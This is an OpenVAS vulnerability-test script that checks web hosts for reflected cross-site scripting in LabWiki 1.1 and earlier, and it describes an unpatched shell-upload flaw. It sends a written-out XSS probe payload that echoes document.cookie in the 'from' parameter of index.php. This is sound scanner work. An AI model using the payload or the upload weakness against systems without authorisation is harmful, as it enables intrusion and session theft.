##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_labwiki_mult_xss_n_shell_upload_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# LabWiki Multiple Cross-site Scripting (XSS) and Shell Upload Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a user's browser session in context of affected website
  and to upload arbitrary PHP files with '.gif' extension.
  Impact Level: Application";
tag_affected = "LabWiki version 1.1 and prior.";

tag_insight = "The flaws are due to an,
  - Input passed to the 'from' parameter in index.php is not properly sanitised
    before being returned to the user.
  - Input passed to the 'page_no' parameter in recentchanges.php is noti
    properly sanitised before being returned to the user.
  - Input passed to the 'userfile' POST parameter in edit.php is not properly
    verified before being used to upload files.";
tag_solution = "No solution or patch is available as of 10th November, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.bioinformatics.org/phplabware/labwiki/index.php";
tag_summary = "This host is running LabWiki and is prone to multiple cross-site
  scripting and shell upload vulnerabilities.";

if(description)
{
  script_id(802402);
  script_version("$Revision: 13 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-11-10 12:48:30 +0530 (Thu, 10 Nov 2011)");
  script_name("LabWiki Multiple Cross-site Scripting (XSS) and Shell Upload Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "https://secunia.com/advisories/46762");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18100/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520441");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/current/0112.html");

  script_description(desc);
  script_summary("Check if LabWiki is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
labPort = get_http_port(default:80);
if(!get_port_state(labPort)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:labPort)){
  exit(0);
}

## Iterate over the possible paths
foreach dir (make_list("/LabWiki", "/labwiki/LabWiki", "", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/index.php"), port:labPort);
  rcvRes = http_keepalive_send_recv(port:labPort, data:sndReq);

  ## Confirm the application
  if('>My Lab</a' >< rcvRes && '>What is Wiki</' >< rcvRes)
  {
    url = string(dir, '/index.php?from="></><script>alert(document.cookie)' +
                      '</script>&help=true&page=What_is_wiki');

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:labPort, url:url, pattern:"><script>alert" +
                       "\(document.cookie\)</script>"))
    {
      security_warning(labPort);
      exit(0);
    }
  }
}
